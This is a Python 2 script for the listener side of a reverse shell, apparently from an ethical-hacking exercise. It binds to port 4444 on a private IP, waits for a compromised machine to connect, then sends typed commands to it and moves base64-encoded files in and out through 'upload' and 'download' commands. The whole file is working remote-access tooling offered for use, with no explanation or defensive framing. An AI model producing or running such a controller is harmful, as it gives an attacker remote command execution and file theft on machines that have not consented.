import socket
import json
import base64


class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("[+] Listener Started, Waiting for Connection....")
        self.connection, address = listener.accept()
        print("[+] Connection Established from " + str(address))

    def box_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def box_recieve(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + str(self.connection.recv(1024))
                return json.loads(json_data)
            except ValueError:
                continue

    def read(self, file_name):
        with open(file_name, "rb") as file:
             return base64.b64encode(file.read())

    def write(self, file_name, content):
        with open(file_name, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Download Successful"

    def run(self):
        while True:
            command = raw_input(">> ")
            command = command.split(" ")
            try:
                if command[0] == "upload":
                    file_content = self.read(command[1])
                    command.append(file_content)
                self.box_send(command)
                if command[0] == "exit":
                    self.connection.close()
                    exit()
                responce = self.box_recieve()
                if command[0] == "download":
                    responce = self.write(command[1], responce)
            except Exception:
                responce = "[+] Error while running the command, please check the command"

            print(responce)


listener_activate = Listener("192.168.116.146", 4444)
listener_activate.run()